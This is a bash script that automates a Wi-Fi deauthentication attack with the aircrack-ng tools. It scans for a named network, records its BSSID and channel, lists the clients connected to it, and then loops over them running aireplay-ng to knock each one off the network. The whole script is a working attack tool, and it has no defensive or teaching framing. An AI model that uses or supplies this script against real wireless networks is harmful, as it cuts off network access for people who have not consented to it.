#! /bin/bash

#IMPORTANT VARIABLE DECLARATIONS
WLAN="wlan0"
SKIP_SCAN=0
TARGET_BSSID=0
TARGET_CHANNEL=0
COUNTER=0

#Flag handler
while getopts "b:c:hi:st:" opt; do
	case $opt in
		b)
			TARGET_BSSID=$OPTARG
			;; 
		c)
			TARGET_CHANNEL=$OPTARG
			;;
		h)
			cat manual.txt
			exit
			;;
		i) 
			WLAN=$OPTARG
			;;
		s)
			echo "skipping automatic scanning"
			SKIP_SCAN=1
			;;
		t) 
			TARGET=$OPTARG
			;;
	esac
done
echo "Interface set as: $WLAN"
echo "Target wifi set as: $TARGET"

if [ $SKIP_SCAN -eq 0 ]; then
	#Clear previous runs
	#rm -rf /runfiles/
	rm -f runfiles/initscan-01.csv

	Counter=0

	#Log initial BSSIDs
	mkdir -p runfiles
	gnome-terminal -e "bash -c \"airodump-ng -w runfiles/initscan --output-format csv $WLAN; exec bash\""
	sleep 15
	kill $(ps aux | grep 'airodump-ng' | awk '{print $2}')> /dev/null

	#Search BSSIDs for target
	MATCHING_LINES=$(grep $TARGET runfiles/initscan-01.csv)
	echo "###DEBUG###"
	echo "$MATCHING_LINES"
	echo "###DEBUG###"

	#echo $2 $MATCHING_LINES

	#Check the number of matching networks and act accordingly
	if [ $(grep $TARGET runfiles/initscan-01.csv | wc -l) -eq 0 ]; then
		echo "ERROR: no matches."
		exit
	elif [ $(grep $TARGET runfiles/initscan-01.csv | wc -l) -ne 0 ]; then
		echo "ERROR: more than one match. Attacking first match."
		TEMP_MATCHING_LINES=$(echo $MATCHING_LINES | head -n 1)
		MATCHING_LINES=$TEMP_MATCHING_LINES
	else
		echo "Correct amount of matches."
	fi

	#Gotta trim the BSSID and channel or commas will screw with everything
	UNTRIMMED_TARGET_BSSID=$(echo $MATCHING_LINES | awk '{print $1;}')
	TARGET_BSSID=${UNTRIMMED_TARGET_BSSID::-1}
	echo "$TARGET_BSSID"
	UNTRIMMED_TARGET_CHANNEL=$(echo $MATCHING_LINES | awk '{print $6;}')
	TARGET_CHANNEL=${UNTRIMMED_TARGET_CHANNEL::-1}
	echo "$TARGET_CHANNEL"
else
	if [ $TARGET_BSSID -eq 0 ] || [ $TARGET_CHANNEL -eq 0 ] ; then
		echo "Incorrect arguments"
		exit
	fi
fi

#Log specific clients on wifi network
rm -f runfiles/specificscan-01.csv
gnome-terminal -e "bash -c \"airodump-ng -c $TARGET_CHANNEL --bssid $TARGET_BSSID -w runfiles/specificscan --output-format csv $WLAN; exec bash\""
sleep 15
kill $(ps aux | grep 'airodump-ng' | awk '{print $2}')> /dev/null

#Open new terminal to capture channel. 
gnome-terminal -e "bash -c \"airodump-ng -c $TARGET_CHANNEL --bssid $TARGET_BSSID $WLAN; exec bash\""
#gnome-terminal -e `airodump-ng -c $TARGET_CHANNEL --bssid $TARGET_BSSID wlan0`

sleep 1

#Loop through text file and deauth all targets
while read line; do
	#Ignore first 5 lines of input
	#Tried to use tail but resulted in ambiguous redirect :/
	if [ $COUNTER -lt 5 ]; then
		COUNTER=$((COUNTER+1))
		echo $COUNTER	
	else
		UNTRIMMED_TARGET=$(echo $line | awk '{print $1;}')
		TARGET_ID=${UNTRIMMED_TARGET::-1}
		echo "KICKING: $TARGET_ID off of $TARGET_BSSID"
		eval aireplay-ng -a $TARGET_BSSID --deauth 100 -c $TARGET_ID $WLAN
	fi
done < runfiles/specificscan-01.csv
gnome-terminal -e -x bash -c ""

#aireplay-ng --deauth 100 -a [SSID] -c [client] [wifi]
